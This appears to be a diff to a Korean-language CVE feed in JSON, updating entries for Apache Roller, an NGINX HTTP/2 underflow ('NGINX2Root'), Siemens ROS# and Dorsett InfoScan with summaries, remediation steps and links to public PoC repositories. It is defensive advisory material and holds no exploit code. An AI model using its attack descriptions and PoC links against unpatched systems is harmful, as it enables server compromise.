@@ -1,12 +1,12 @@
 {
   "meta": {
-    "total": 126,
-    "critical": 80,
-    "high": 20,
+    "total": 131,
+    "critical": 85,
+    "high": 21,
     "kev": 28,
-    "poc": 22,
-    "collected_at": "2026-11-19 08:11:37 KST",
-    "built_at": "2026-11-19 08:22 KST",
+    "poc": 27,
+    "collected_at": "2026-11-19 09:32:09 KST",
+    "built_at": "2026-11-19 09:43 KST",
     "sources": [
       "CISA KEV",
       "CISA 경보",
@@ -1277,10 +1277,10 @@
     },
     {
       "cve_id": "CVE-2026-129448",
-      "title_ko": "Apache Software Foundation Apache Roller 역직렬화 취약점",
-      "summary_ko": "CVE-2026-129448는 Apache Software Foundation Apache Roller에서 확인된 역직렬화 취약점입니다. CVSS 9.8점(치명적)으로 평가됐습니다.",
-      "impact_ko": "신뢰할 수 없는 데이터가 역직렬화되면서 원격 코드 실행으로 이어질 수 있습니다.",
-      "remediation_ko": "① 영향 범위는 6.1.5 미만 버전이며, 자산 목록과 대조해 6.1.5 이상 버전으로 업데이트하면 해결됩니다. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Apache Roller 역직렬화 원격 코드 실행 취약점",
+      "summary_ko": "Apache Roller 4.0.0~6.1.4의 XML-RPC 엔드포인트는 요청자 인증 전에 vendor extension type을 역직렬화하며, CWE-502에 해당하고 CVSS 9.8 Critical로 평가된다. 인증되지 않은 원격 공격자가 임의 코드를 실행할 수 있고 현재 활발히 악용되고 있다. 6.1.6 이상은 extension type을 비활성화하고 XML-RPC가 비활성화된 경우 요청을 거부한다.",
+      "impact_ko": "인증 없이 원격 코드 실행이 가능해 서버 장악, 데이터 유출·변조, 서비스 중단으로 이어질 수 있다.",
+      "remediation_ko": "① Apache Roller를 6.1.6 이상으로 업그레이드한다. ② 즉시 업그레이드가 어려우면 WEB-INF/web.xml의 enabledForExtensions를 false로 설정하거나 /roller-services/xmlrpc 서블릿 매핑을 제거하고 Roller를 재시작한다. ③ 관리자 UI의 XML-RPC 비활성화만으로는 불충분하므로 설정과 매핑을 점검하고 인터넷 노출 자산을 우선 확인한다.",
       "cvss_score": 9.8,
       "severity": "CRITICAL",
       "epss_score": null,
@@ -1321,12 +1321,110 @@
       "description_orig": "Deserialization of Untrusted Data in Apache Roller versions 4.0.0 through 6.1.4 allows an unauthenticated remote attacker to execute arbitrary code. The XML-RPC endpoint accepts vendor extension types and deserializes them before authenticating the requester. This is the same vulnerability as CVE-2026-82384, which listed only Apache Roller 6.1.5 as affected. This issue is being actively exploited. Users are recommended to upgrade to Apache Roller 6.1.6 or later, which disables the extension types and rejects XML-RPC requests when the XML-RPC feature is disabled. Users who cannot upgrade right away should set \"enabledForExtensions\" to \"false\" in WEB-INF/web.xml, or remove the \"/roller-services/xmlrpc\" servlet mapping, and restart Roller. Disabling XML-RPC in the administration UI is not enough, because older versions deserialize the request before checking that setting.",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-18 06:40:47 KST",
-      "analyzed_by": "fallback:budget",
+      "analyzed_by": "exaone",
       "alerts": [
         {
           "source": "The Hacker News",
           "title": "Critical Apache Roller RCE Flaw Under Active Exploitation, No Authentication Required",
           "url": "https://thehackernews.com/2026/11/critical-apache-roller-rce-flaw-under.html",
+          "published_at": "2026-11-18"
+        }
+      ]
+    },
+    {
+      "cve_id": "CVE-2026-123007",
+      "title_ko": "NGINX2Root — NGINX HTTP/2 흐름제어 정수 언더플로 힙 손상 및 원격 코드 실행 (CVE-2026-123007)",
+      "summary_ko": "NGINX2Root로 묶여 공개된 NGINX 취약점 5종 가운데 핵심인 CVE-2026-123007은 HTTP/2 흐름제어 회계 오류(CWE-191 정수 언더플로)로 응답 복사 길이가 음수로 뒤집혀 힙 경계를 넘는 쓰기가 발생하는 메모리 손상 결함입니다. HTTP/2가 켜진 리스너에 인증 없이 접속할 수 있는 원격 공격자가 요청 취소로 송신 윈도(flow-control window)를 조작한 뒤 다음 응답에서 잘못된 길이를 쓰게 만들어 메모리를 유출하고 nginx 워커 프로세스 권한으로 임의 코드를 실행할 수 있습니다. F5는 CVSS 4.0 9.2(치명적)·CVSS 3.1 8.1(높음)로 평가했고, 2015년 NGINX 1.9.5부터 들어간 결함이라 전 세계 2억 2,500만 사이트가 쓰는 웹서버 전면부가 영향 범위입니다. Xint는 공개 HTTPS 포트에서 주소 유출 후 명령 실행까지 시연했고 공개 PoC 코드도 배포됐습니다. 2026-11-18 기준 실제 악용 정황은 보고되지 않았습니다.",
+      "impact_ko": "NGINX Open Source 1.9.5~1.31.8(안정 브랜치 1.30.0~1.30.6 포함)과 NGINX Plus 37.0.0~37.0.7.1·37.1.0~37.2.0.1·R33~R36에서 HTTP/2가 켜진 리스너가 대상입니다. 공격자는 nginx 워커 권한으로 코드를 실행해 리버스 프록시 뒤 백엔드가 신뢰하는 위치를 장악하고 데이터 탈취·웹 변조·서비스 중단을 일으킬 수 있습니다. 워커가 root가 아닌 환경에서는 Xint가 함께 공개한 Linux 커널 SCTP 서브시스템 결함(4.15 커널부터 존재, CVE 미부여·패치 없음)과 체이닝해 Docker 컨테이너 안의 NGINX에서 호스트 root까지 탈취하는 경로가 시연됐습니다. 다만 NGINX 취약점 자체가 곧바로 호스트 root를 주지는 않습니다.",
+      "remediation_ko": "① NGINX Open Source 1.30.7(안정)·1.31.9(메인라인) 이상 또는 NGINX Plus 37.0.8.1·37.3.0.1 이상으로 즉시 업데이트하고 재시작하세요. 구 브랜치(1.9.5~1.29.x)는 수정 빌드가 없어 1.30.7/1.31.9로 올려야 합니다. ② 즉시 패치가 어려우면 노출된 리스너의 HTTP/2를 끄세요 — listen 지시문의 http2 파라미터 제거 또는 http2 off;(1.25.1 이상 server 블록). 이 조치는 123007·123633만 막고 121810(HTTP/3)·123634·113425에는 효과가 없습니다. ③ SCTP가 필요 없는 호스트는 커널 모듈 자동 로드를 차단(install sctp /bin/false)하고, 컨테이너는 호스트 커널 기준으로 점검하세요. ④ 컨테이너 이미지·Helm 차트·Kubernetes 인그레스 컨트롤러·어플라이언스에 번들된 NGINX까지 자산 목록에 넣고 배포판 백포트 여부를 벤더 공지로 확인하세요. ⑤ 워커 크래시('worker process ... exited on signal')와 비정상 프로세스 생성을 모니터링하세요.",
+      "cvss_score": 9.2,
+      "severity": "CRITICAL",
+      "epss_score": null,
+      "epss_percentile": null,
+      "is_kev": false,
+      "kev_date_added": "",
+      "kev_due_date": "",
+      "kev_required_action": "",
+      "kev_ransomware": "",
+      "vendor": "F5",
+      "product": "NGINX Open Source / NGINX Plus",
+      "affected_products": [
+        "NGINX Open Source 1.9.5 ~ 1.31.8 (HTTP/2 사용 시)",
+        "NGINX Open Source stable 1.30.0 ~ 1.30.6",
+        "NGINX Plus 37.0.0 ~ 37.0.7.1 / 37.1.0 ~ 37.2.0.1 / R33 ~ R36",
+        "컨테이너·Kubernetes 인그레스·어플라이언스에 번들된 NGINX"
+      ],
+      "poc_count": 3,
+      "poc_links": [
+        {
+          "name": "sfewer-r7/CVE-2026-123007",
+          "url": "https://github.com/sfewer-r7/CVE-2026-123007",
+          "stars": 101,
+          "description": "PoC scripts for CVE-2026-123007 integer underflow in NGINX HTTP/2"
+        },
+        {
+          "name": "arkrwn/NGINX2Root-CVE-2026-123007",
+          "url": "https://github.com/arkrwn/NGINX2Root-CVE-2026-123007",
+          "stars": 0,
+          "description": "Research note: turning public intelligence into a root exploit (CVE-2026-123007)"
+        },
+        {
+          "name": "Censys-Research/nginx2root",
+          "url": "https://github.com/Censys-Research/nginx2root",
+          "stars": 0,
+          "description": "Censys reproductions of the five nginx2root vulnerabilities"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://www.circl.lu/pub/tr-105/",
+          "title": "CIRCL TR-105 NGINX2ROOT - Remote Code Execution in NGINX and Potential Host Compromise"
+        },
+        {
+          "url": "https://cert.europa.eu/publications/security-advisories/2026-022/",
+          "title": "CERT-EU Security Advisory 2026-022 - Critical vulnerabilities in Nginx"
+        },
+        {
+          "url": "https://www.sophos.com/en-us/security-advisories/sophos-sa-20261118-nginx2root",
+          "title": "Sophos Advisory: NGINX Vulnerabilities - nginx2root"
+        },
+        {
+          "url": "https://blog.qualys.com/product-tech/patch-management/2026/11/18/nginx2root-five-nginx-flaws-led-by-cve-2026-123007-how-to-find-mitigate-and-patch-now",
+          "title": "Qualys: NGINX2Root - Five nginx Flaws, Led by CVE-2026-123007"
+        },
+        {
+          "url": "https://thehackernews.com/2026/11/10-year-old-nginx-http2-flaw-lets.html",
+          "title": "The Hacker News: 10-Year-Old NGINX HTTP/2 Flaw Lets Unauthenticated Attackers Execute Code"
+        },
+        {
+          "url": "https://lwn.net/Articles/1108362/",
+          "title": "LWN: NGINX2Root - Remote Code Execution vulnerabilities in nginx"
+        },
+        {
+          "url": "https://docs.nginx.com/nginx/releases/",
+          "title": "NGINX Releases (1.30.7 / 1.31.9 보안 릴리스)"
+        },
+        {
+          "url": "https://www.rapid7.com/blog/post/ve-cve-2026-123007-critical-nginx-http-2-integer-underflow-leads-to-rce-fixed/",
+          "title": "Rapid7: CVE-2026-123007 Critical NGINX HTTP/2 Integer Underflow Leads to RCE"
+        },
+        {
+          "url": "https://www.wiz.io/blog/nginx-http2-rce-vulnerabilities",
+          "title": "Wiz: Unauthenticated Remote Code Execution in NGINX"
+        }
+      ],
+      "cwe": [
+        "CWE-191"
+      ],
+      "description_orig": "NGINX HTTP/2 flow-control integer underflow (CWE-191) allows an unauthenticated remote attacker to corrupt heap memory and execute code with the privileges of the nginx worker process. Affects NGINX Open Source 1.9.5 through 1.31.8 when HTTP/2 is enabled; fixed in 1.30.7 (stable) and 1.31.9 (mainline). Part of the NGINX2Root disclosure (2026-11-18).",
+      "published_at": "2026-11-18",
+      "updated_at": "2026-11-19 09:32:09 KST",
+      "analyzed_by": "curated",
+      "alerts": [
+        {
+          "source": "The Hacker News",
+          "title": "10-Year-Old NGINX HTTP/2 Flaw Lets Unauthenticated Attackers Execute Code on Servers",
+          "url": "https://thehackernews.com/2026/11/10-year-old-nginx-http2-flaw-lets.html",
           "published_at": "2026-11-18"
         }
       ]
@@ -1422,10 +1520,10 @@
     },
     {
       "cve_id": "CVE-2026-109097",
-      "title_ko": "Siemens ROS# 원격 코드 실행(RCE) 취약점",
-      "summary_ko": "CVE-2026-109097는 Siemens ROS#에서 확인된 원격 코드 실행(RCE) 취약점입니다. CVSS 8.2점(높음)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 0.1%(악용 위험 상위 98% 수준)입니다.",
-      "impact_ko": "공격자가 원격에서 임의 코드를 실행해 서버를 완전히 장악하고, 내부 데이터 유출·추가 침해의 발판으로 삼을 수 있습니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Siemens ROS# 메시지 정의 파일 코드 주입 취약점",
+      "summary_ko": "Siemens ROS#의 V2.3.1 미만 버전은 메시지 정의 파일 텍스트를 적절히 이스케이프하지 못하는 코드 주입 취약점(CWE-94)이 확인되었습니다. 공격자가 조작된 메시지 정의 파일을 사용자에게 전달할 수 있는 조건에서, 해당 파일을 기반으로 생성된 프로그램에 임의 코드가 주입될 수 있습니다. 이로 인해 생성된 프로그램이 빌드·실행되는 환경에서는 추가 피해로 이어질 가능성이 있습니다.",
+      "impact_ko": "조작된 메시지 정의 파일이 처리되어 생성된 프로그램에 임의 코드가 주입될 수 있습니다. 해당 프로그램이 신뢰된 환경에서 빌드·실행되면 사용자 권한 범위의 코드 실행이나 데이터 변조로 이어질 수 있습니다.",
+      "remediation_ko": "① Siemens ROS#를 V2.3.1 이상으로 업데이트합니다. ② 출처가 불분명하거나 신뢰할 수 없는 메시지 정의 파일을 사용자에게 전달·열람하지 않도록 하고 수신·처리 절차를 통제합니다. ③ 관련 개발·빌드 자산이 인터넷에 노출된 경우 우선 점검하여 접근을 제한합니다.",
       "cvss_score": 8.2,
       "severity": "HIGH",
       "epss_score": 0.00121,
@@ -1454,7 +1552,7 @@
       "description_orig": "A vulnerability has been identified in ROS# (All versions < V2.3.1). Affected systems do not properly escape text of message definition files. This could allow an attacker that is able to pass a crafted message definition file to the user to inject arbitrary code into the generated program.",
       "published_at": "2026-11-10",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget",
+      "analyzed_by": "exaone",
       "alerts": [
         {
           "source": "CISA ICS Advisory",
@@ -1465,13 +1563,13 @@
       ]
     },
     {
-      "cve_id": "CVE-2026-120298",
-      "title_ko": "영향 제품 인증 우회 취약점",
-      "summary_ko": "CVE-2026-120298는 영향 제품에서 확인된 인증 우회 취약점입니다.",
-      "impact_ko": "인증 없이 보호된 기능·관리 화면에 접근해 설정 변경과 데이터 조회가 가능합니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
-      "cvss_score": null,
-      "severity": "UNKNOWN",
+      "cve_id": "CVE-2026-117659",
+      "title_ko": "Dorsett InfoScan TLS 인증서 검증 미흡 취약점",
+      "summary_ko": "Dorsett Controls InfoScan Electron 데스크톱 클라이언트는 TLS 인증서 오류를 적절히 처리하지 않아 신뢰할 수 없는 인증서도 검증 없이 수용할 수 있습니다. 또한 Electron 설정에서 nodeIntegration 활성화, contextIsolation 비활성화, webSecurity 비활성화가 적용되어 클라이언트 보안 경계가 약화됩니다. 네트워크 통신을 가로채거나 조작할 수 있는 공격자는 신뢰할 수 없는 인증서를 제시해 연결이 거부되지 않도록 할 수 있습니다.",
+      "impact_ko": "중간자 공격으로 통신 가로채기·조작 가능성이 생기고, 약화된 클라이언트 경계로 인해 추가 악용 위험이 커질 수 있습니다.",
+      "remediation_ko": "① 영향 버전(Dorsett Controls InfoScan <= 1.45.0) 사용 여부를 점검하고 TLS 인증서 검증을 강제하도록 업데이트·설정을 검토합니다. ② Electron 설정을 최소 권한으로 재정비하고 nodeIntegration·contextIsolation·webSecurity 설정을 보안 기준에 맞게 조정합니다. ③ 인터넷 노출 자산과 원격 통신 경로를 우선 점검해 중간자 공격 가능성을 줄입니다.",
+      "cvss_score": 8.1,
+      "severity": "HIGH",
       "epss_score": null,
       "epss_percentile": null,
       "is_kev": false,
@@ -1479,9 +1577,11 @@
       "kev_due_date": "",
       "kev_required_action": "",
       "kev_ransomware": "",
-      "vendor": "",
-      "product": "",
-      "affected_products": [],
+      "vendor": "Dorsett Controls",
+      "product": "InfoScan",
+      "affected_products": [
+        "Dorsett Controls InfoScan <= 1.45.0"
+      ],
       "poc_count": 0,
       "poc_links": [],
       "references": [
@@ -1490,51 +1590,13 @@
           "title": "Dorsett Controls InfoScan"
         }
       ],
-      "cwe": [],
-      "description_orig": "View CSAF Summary Successful exploitation of these vulnerabilities could allow an attacker to retrieve sensitive system information, access application data without authorization, recover stored credentials, or intercept and manipulate network communications. The following versions of Dorsett Controls InfoScan are affected: InfoScan &lt;=1.45.0 (CVE-2026-117659, CVE-2026-120157, CVE-2026-120255, CVE-2026-120260, CVE-2026-120271, CVE-2026-120298) CVSS Vendor Equipment v3 8.1 Dorsett Controls InfoScan 5 Vulnerabilities Improper Certificate Validation, Exposure of Sensitive System Information to an Unauthorized Control Sphere, Use of Hard-coded Cryptographic Key, Missing Authentication for Critical Function, Generation of Error Message Containing Sensitive Information Background Critical Infrastructure Sectors: Water and Wastewater Systems Countries/Areas Deployed: Worldwide Company Headquarters Location: United States Vulnerabilities Expand All + CVE-2026-117659 The InfoScan Electron desktop client improperly handles TLS certificate errors by accepting certificates without validating their trustworthiness. The client also configures Electron with nodeIntegration enabled, contextIsola…",
-      "published_at": "2026-11-17",
-      "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget",
-      "alerts": [
-        {
-          "source": "CISA ICS Advisory",
-          "title": "Dorsett Controls InfoScan",
-          "url": "https://www.cisa.gov/news-events/ics-advisories/icsa-26-321-01",
-          "published_at": "2026-11-17"
-        }
-      ]
-    },
-    {
-      "cve_id": "CVE-2026-120271",
-      "title_ko": "영향 제품 인증 우회 취약점",
-      "summary_ko": "CVE-2026-120271는 영향 제품에서 확인된 인증 우회 취약점입니다.",
-      "impact_ko": "인증 없이 보호된 기능·관리 화면에 접근해 설정 변경과 데이터 조회가 가능합니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
-      "cvss_score": null,
-      "severity": "UNKNOWN",
-      "epss_score": null,
-      "epss_percentile": null,
-      "is_kev": false,
-      "kev_date_added": "",
-      "kev_due_date": "",
-      "kev_required_action": "",
-      "kev_ransomware": "",
-      "vendor": "",
-      "product": "",
-      "affected_products": [],
-      "poc_count": 0,
-      "poc_links": [],
-      "references": [
-        {
-          "url": "https://www.cisa.gov/news-events/ics-advisories/icsa-26-321-01",
-          "title": "Dorsett Controls InfoScan"
-        }
+      "cwe": [
+        "CWE-295"
       ],
-      "cwe": [],
-      "description_orig": "View CSAF Summary Successful exploitation of these vulnerabilities could allow an attacker to retrieve sensitive system information, access application data without authorization, recover stored credentials, or intercept and manipulate network communications. The following versions of Dorsett Controls InfoScan are affected: InfoScan &lt;=1.45.0 (CVE-2026-117659, CVE-2026-120157, CVE-2026-120255, CVE-2026-120260, CVE-2026-120271, CVE-2026-120298) CVSS Vendor Equipment v3 8.1 Dorsett Controls InfoScan 5 Vulnerabilities Improper Certificate Validation, Exposure of Sensitive System Information to an Unauthorized Control Sphere, Use of Hard-coded Cryptographic Key, Missing Authentication for Critical Function, Generation of Error Message Containing Sensitive Information Background Critical Infrastructure Sectors: Water and Wastewater Systems Countries/Areas Deployed: Worldwide Company Headquarters Location: United States Vulnerabilities Expand All + CVE-2026-117659 The InfoScan Electron desktop client improperly handles TLS certificate errors by accepting certificates without validating their trustworthiness. The client also configures Electron with nodeIntegration enabled, contextIsola…",
+      "description_orig": "The InfoScan Electron desktop client improperly handles TLS certificate errors by accepting certificates without validating their trustworthiness. The client also configures Electron with nodeIntegration enabled, contextIsolation disabled and webSecurity disabled, weakening the client's security boundaries. An attacker able to intercept or manipulate network communications may present an untrusted certificate without the application rejecting the connection.",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget",
+      "analyzed_by": "exaone",
       "alerts": [
         {
           "source": "CISA ICS Advisory",
@@ -1546,12 +1608,12 @@
     },
     {
       "cve_id": "CVE-2026-120260",
-      "title_ko": "영향 제품 인증 우회 취약점",
-      "summary_ko": "CVE-2026-120260는 영향 제품에서 확인된 인증 우회 취약점입니다.",
-      "impact_ko": "인증 없이 보호된 기능·관리 화면에 접근해 설정 변경과 데이터 조회가 가능합니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
-      "cvss_score": null,
-      "severity": "UNKNOWN",
+      "title_ko": "Dorsett InfoScan 템플릿 검색 인증 미흡 취약점",
+      "summary_ko": "Dorsett Controls InfoScan은 판매 자동화 템플릿을 검색하는 엔드포인트에 인증을 강제하지 않아 CWE-306 누락된 인증 문제가 있습니다. 로컬 공격자는 유효한 세션 없이 해당 엔드포인트에 HTTP 요청을 보내 반환된 템플릿 데이터를 검색할 수 있습니다. 영향 버전은 Dorsett Controls InfoScan <= 1.45.0입니다.",
+      "impact_ko": "인증되지 않은 로컬 공격자가 판매 자동화 템플릿 데이터를 조회할 수 있습니다.",
+      "remediation_ko": "① 해당 템플릿 검색 엔드포인트에 인증과 세션 검증을 강제합니다. ② 엔드포인트 접근 범위를 제한하고 비정상 요청 모니터링을 적용합니다. ③ 영향 버전 자산을 점검하고 인터넷 노출 자산이 있으면 우선 확인합니다.",
+      "cvss_score": 5.5,
+      "severity": "MEDIUM",
       "epss_score": null,
       "epss_percentile": null,
       "is_kev": false,
@@ -1559,9 +1621,11 @@
       "kev_due_date": "",
       "kev_required_action": "",
       "kev_ransomware": "",
-      "vendor": "",
-      "product": "",
-      "affected_products": [],
+      "vendor": "Dorsett Controls",
+      "product": "InfoScan",
+      "affected_products": [
+        "Dorsett Controls InfoScan <= 1.45.0"
+      ],
       "poc_count": 0,
       "poc_links": [],
       "references": [
@@ -1570,11 +1634,13 @@
           "title": "Dorsett Controls InfoScan"
         }
       ],
-      "cwe": [],
-      "description_orig": "View CSAF Summary Successful exploitation of these vulnerabilities could allow an attacker to retrieve sensitive system information, access application data without authorization, recover stored credentials, or intercept and manipulate network communications. The following versions of Dorsett Controls InfoScan are affected: InfoScan &lt;=1.45.0 (CVE-2026-117659, CVE-2026-120157, CVE-2026-120255, CVE-2026-120260, CVE-2026-120271, CVE-2026-120298) CVSS Vendor Equipment v3 8.1 Dorsett Controls InfoScan 5 Vulnerabilities Improper Certificate Validation, Exposure of Sensitive System Information to an Unauthorized Control Sphere, Use of Hard-coded Cryptographic Key, Missing Authentication for Critical Function, Generation of Error Message Containing Sensitive Information Background Critical Infrastructure Sectors: Water and Wastewater Systems Countries/Areas Deployed: Worldwide Company Headquarters Location: United States Vulnerabilities Expand All + CVE-2026-117659 The InfoScan Electron desktop client improperly handles TLS certificate errors by accepting certificates without validating their trustworthiness. The client also configures Electron with nodeIntegration enabled, contextIsola…",
+      "cwe": [
+        "CWE-306"
+      ],
+      "description_orig": "InfoScan does not enforce authentication on an endpoint used to retrieve sales-automation templates. A local attacker can submit an HTTP request to the affected endpoint without a valid session and retrieve the returned template data.",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget",
+      "analyzed_by": "exaone",
       "alerts": [
         {
           "source": "CISA ICS Advisory",
@@ -1585,13 +1651,13 @@
       ]
     },
     {
-      "cve_id": "CVE-2026-120255",
-      "title_ko": "영향 제품 인증 우회 취약점",
-      "summary_ko": "CVE-2026-120255는 영향 제품에서 확인된 인증 우회 취약점입니다.",
-      "impact_ko": "인증 없이 보호된 기능·관리 화면에 접근해 설정 변경과 데이터 조회가 가능합니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
-      "cvss_score": null,
-      "severity": "UNKNOWN",
+      "cve_id": "CVE-2026-120298",
+      "title_ko": "Dorsett Controls InfoScan 오류 메시지 정보 노출 취약점",
+      "summary_ko": "CVE-2026-120298은 Dorsett Controls InfoScan 1.45.0 이하에서 로그인 및 비밀번호 재설정 엔드포인트가 특정 불완전하거나 잘못된 요청을 적절히 처리하지 못하는 문제입니다. 이로 인해 처리되지 않은 서버 예외가 발생하고 Node.js 스택 추적이 반환되어 내부 파일시스템 경로, 애플리케이션 디렉터리 이름, 소스 파일 위치와 줄 번호가 노출될 수 있습니다.",
+      "impact_ko": "공격 성공 시 내부 구조와 소스 위치 정보가 드러나 추가 취약점 악용이나 공격 정교화에 도움을 줄 수 있습니다.",
+      "remediation_ko": "① 인터넷 노출 자산을 우선 점검하고 로그인·비밀번호 재설정 엔드포인트로의 비정상 요청 유입을 모니터링합니다. ② 운영 환경에서 상세 오류 메시지와 스택 추적 노출을 차단하고 입력 검증 및 예외 처리를 강화합니다. ③ 제조사 보안 공지와 업데이트를 확인해 검증된 경우 적용합니다.",
+      "cvss_score": 5.3,
+      "severity": "MEDIUM",
       "epss_score": null,
       "epss_percentile": null,
       "is_kev": false,
@@ -1599,9 +1665,11 @@
       "kev_due_date": "",
       "kev_required_action": "",
       "kev_ransomware": "",
-      "vendor": "",
-      "product": "",
-      "affected_products": [],
+      "vendor": "Dorsett Controls",
+      "product": "InfoScan",
+      "affected_products": [
+        "Dorsett Controls InfoScan <= 1.45.0"
+      ],
       "poc_count": 0,
       "poc_links": [],
       "references": [
@@ -1610,11 +1678,57 @@
           "title": "Dorsett Controls InfoScan"
         }
       ],
-      "cwe": [],
-      "description_orig": "View CSAF Summary Successful exploitation of these vulnerabilities could allow an attacker to retrieve sensitive system information, access application data without authorization, recover stored credentials, or intercept and manipulate network communications. The following versions of Dorsett Controls InfoScan are affected: InfoScan &lt;=1.45.0 (CVE-2026-117659, CVE-2026-120157, CVE-2026-120255, CVE-2026-120260, CVE-2026-120271, CVE-2026-120298) CVSS Vendor Equipment v3 8.1 Dorsett Controls InfoScan 5 Vulnerabilities Improper Certificate Validation, Exposure of Sensitive System Information to an Unauthorized Control Sphere, Use of Hard-coded Cryptographic Key, Missing Authentication for Critical Function, Generation of Error Message Containing Sensitive Information Background Critical Infrastructure Sectors: Water and Wastewater Systems Countries/Areas Deployed: Worldwide Company Headquarters Location: United States Vulnerabilities Expand All + CVE-2026-117659 The InfoScan Electron desktop client improperly handles TLS certificate errors by accepting certificates without validating their trustworthiness. The client also configures Electron with nodeIntegration enabled, contextIsola…",
+      "cwe": [
+        "CWE-209"
+      ],
+      "description_orig": "InfoScan fails to properly handle certain malformed or incomplete requests to its login and password-reset endpoints. These requests trigger unhandled server exceptions that return detailed Node.js stack traces, disclosing internal filesystem paths, application directory names, source file locations and line numbers.",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget",
+      "analyzed_by": "exaone",
+      "alerts": [
+        {
+          "source": "CISA ICS Advisory",
+          "title": "Dorsett Controls InfoScan",
+          "url": "https://www.cisa.gov/news-events/ics-advisories/icsa-26-321-01",
+          "published_at": "2026-11-17"
+        }
+      ]
+    },
+    {
+      "cve_id": "CVE-2026-120271",
+      "title_ko": "Dorsett Controls InfoScan 정보 노출 취약점",
+      "summary_ko": "CVE-2026-120271은 Dorsett Controls InfoScan 1.45.0 이하에서 모바일 열거 및 버전 보고 엔드포인트에 인증되지 않은 정보 노출 취약점이 있는 문제입니다. 원격 공격자는 인증 없이 HTTP 요청을 보내 사용자 이름과 표시 이름, 다중 인증 상태, 세션 설정, 애플리케이션 버전, 서버 세부정보, 하드웨어 모듈 펌웨어 버전, 설치 환경의 BACnet/IP 포트 등을 조회할 수 있습니다.",
+      "impact_ko": "공격 성공 시 시스템 구성과 사용자 관련 정보가 노출되어 추가 공격의 정찰 자료로 악용될 수 있습니다.",
+      "remediation_ko": "① 인터넷에 노출된 InfoScan 자산을 우선 식별하고 해당 엔드포인트 접근 가능 여부를 점검합니다. ② 불필요한 모바일 열거·버전 보고 기능의 노출을 제한하고 네트워크 접근 제어를 적용합니다. ③ 제조사 보안 공지와 업데이트를 확인하고 검증된 경우 적용합니다.",
+      "cvss_score": 5.3,
+      "severity": "MEDIUM",
+      "epss_score": null,
+      "epss_percentile": null,
+      "is_kev": false,
+      "kev_date_added": "",
+      "kev_due_date": "",
+      "kev_required_action": "",
+      "kev_ransomware": "",
+      "vendor": "Dorsett Controls",
+      "product": "InfoScan",
+      "affected_products": [
+        "Dorsett Controls InfoScan <= 1.45.0"
+      ],
+      "poc_count": 0,
+      "poc_links": [],
+      "references": [
+        {
+          "url": "https://www.cisa.gov/news-events/ics-advisories/icsa-26-321-01",
+          "title": "Dorsett Controls InfoScan"
+        }
+      ],
+      "cwe": [
+        "CWE-497"
+      ],
+      "description_orig": "InfoScan contains an unauthenticated information disclosure vulnerability in its mobile-enumeration and version-reporting endpoints. A remote attacker can send HTTP requests without authentication to retrieve system configuration information, including usernames and display names, multifactor authentication status, session settings, application version, server details, hardware module firmware versions and the BACnet/IP port used by the installation.",
+      "published_at": "2026-11-17",
+      "updated_at": "2026-11-19 08:11:37 KST",
+      "analyzed_by": "exaone",
       "alerts": [
         {
           "source": "CISA ICS Advisory",
@@ -1626,12 +1740,12 @@
     },
     {
       "cve_id": "CVE-2026-120157",
-      "title_ko": "영향 제품 인증 우회 취약점",
-      "summary_ko": "CVE-2026-120157는 영향 제품에서 확인된 인증 우회 취약점입니다.",
-      "impact_ko": "인증 없이 보호된 기능·관리 화면에 접근해 설정 변경과 데이터 조회가 가능합니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
-      "cvss_score": null,
-      "severity": "UNKNOWN",
+      "title_ko": "Dorsett InfoScan 설치파일 호스트명 정보 노출 취약점",
+      "summary_ko": "공개 배포되는 Dorsett Controls InfoScan Electron 설치 프로그램에는 고객 설치와 내부 개발·테스트 및 데이터베이스 인프라에 관련된 호스트명을 식별하는 구성 파일이 포함되어 있습니다. 영향 버전은 Dorsett Controls InfoScan <= 1.45.0입니다. 설치 프로그램을 획득해 검사한 개인은 영향을 받는 시스템에 접근 인증 없이 이러한 호스트명을 추출할 수 있습니다.",
+      "impact_ko": "내부 인프라 호스트명 등 구성 정보가 노출되어 추가 정찰에 이용될 수 있습니다.",
